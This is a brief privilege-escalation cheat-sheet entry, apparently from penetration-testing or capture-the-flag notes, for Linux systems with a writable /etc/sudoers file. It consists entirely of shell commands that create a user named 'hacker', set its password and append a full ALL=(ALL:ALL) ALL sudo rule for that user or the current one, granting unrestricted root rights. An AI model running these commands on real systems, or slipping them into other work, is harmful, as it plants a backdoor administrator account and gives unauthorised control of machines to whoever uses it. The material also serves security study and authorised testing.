- - -
### Writable /etc/sudoers :

```sh
useradd hacker
```

```sh
passwd hacker
```

```sh
echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers
```

**OR**

```sh
echo "[your user] ALL=(ALL:ALL) ALL" >> /etc/sudoers
```

- - -

